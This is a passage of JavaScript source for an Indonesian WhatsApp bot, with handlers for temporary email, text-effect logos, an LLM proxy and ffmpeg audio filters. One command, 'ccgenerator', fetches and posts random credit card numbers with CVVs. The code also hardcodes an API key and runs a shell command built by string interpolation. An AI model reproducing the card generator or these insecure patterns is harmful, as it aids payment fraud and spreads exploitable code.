                let eml = await random_mail()
                let timeDiff = new Date(eml[2]) - new Date()
                alifatah.dropmail[id] = [
                    await reply("*EMAIL:*\n" + eml[0] + "\n\n" + "*ID:*\n" + eml[1] + "\n\n*Expired:*\n" + msToTime(timeDiff) + `\n\n_Ketik *${prefix + command} message* Untuk mengecek inbox_`),
                    eml[0],
                    eml[1],
                    eml[2]
                ]
            } catch (e) {
                await reply(eror)
            }
        }

        if (feature == "message") {
            if (!alifatah.dropmail[id]) return reply(`Tidak ada pesan, buat email terlebih dahulu\nKetik *${prefix + command} create*`)

            try {
                let eml = await get_mails(alifatah.dropmail[id][2])
                let teks = eml[0].map((v, index) => {
                    return `*EMAIL [ ${index + 1} ]*
*Dari* : ${v.fromAddr}
*Untuk* : ${v.toAddr}

*Pesan* : ${v.text}
*Size* : ${formatSize(v.rawSize)}
*Header* : ${v.headerSubject}
*Download* : ${v.downloadUrl}
   `.trim()
                }).filter(v => v).join("\n\n________________________\n\n")
                await reply(teks || `*KOSONG*" + "\n\n_Ketik ${prefix + command} delete* Untuk menghapus email_`)
            } catch (e) {
                await reply(eror)
            }
        }
        if (feature == "delete") {
            if (!alifatah.dropmail[id]) return reply("Tidak ada email yang terpakai")

            try {
                delete alifatah.dropmail[id]
                await reply("Sukses menghapus email")
            } catch (e) {
                await reply(eror)
            }
        }

    }
}
break

case 'logoneko':{
  if (!q) return reply(`Nama nya mana?`)
  reply(mess.wait)
  alifatah.sendMessage(m.chat, { image: { url: `https://api.caliph.biz.id/api/girlneko?nama=${q}&nama2=dev&apikey=CcVXxbMw`
 }, caption: `_Ini Dia Logo Nya Kak_` }, { quoted:fcall})
}
break

case 'ccgenerator': {
  let ccg = await (await fetch('https://itzpire.com/random/bingen')).json();
  let sul = ccg.data;
  let randomIndex = Math.floor(Math.random() * sul.length);
  let res = sul[randomIndex];
  reply(`💳 *CC GENRATOR*\n> *CardNumber:* ${res.CardNumber}\n> *ExpirationDate:* ${res.ExpirationDate}\n> *CVV:* ${res.CVV}`);
}
break

case 'llama70b': 
  if (!text) return reply('masukkan pertanyaan mu!')
  try {
    let shannz = await (await fetch(`https://api.shannmoderz.xyz/ai/llama3?query=${text}`)).json();
    reply(shannz.result.output);
} catch (e) {
    reply('rest api maintanace!');
  }
break

case 'addtesti':{
if (!isCreator) return reply('Khusus Creator')
if (args.length < 1) return reply('Whats the image name?')
if (imagenya.includes(q)) return reply("Nama Testi Tersebut Sudah Ada")
let delb = await alifatah.downloadAndSaveMediaMessage(quoted)
imagenya.push(q)
await fsx.copy(delb, `./V5Moni/${q}.jpg`)
fs.writeFileSync('./database/image.json', JSON.stringify(imagenya))
fs.unlinkSync(delb)
reply(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'testimoni':{
let teks = '┌──࿐「 *Testi List* 」\n│\n'
for (let x of imagenya) {
teks += `│◦ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${imagenya.length}*`
reply(teks)
}
break

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                reply(mess.wait)
                let media = await alifatah.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                alifatah.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : fcall })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break

case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return reply(`Example : ${prefix+command} alifatahBotz`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
alifatah.sendMessage(m.chat, { image: { url: haldwhd }, caption: `success` }, { quoted: fcall })
}
break

default:
}
} catch (err) {
console.log(require('util').format(err));
}
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(`Update ${__filename}`);
delete require.cache[file];
require(file);
});
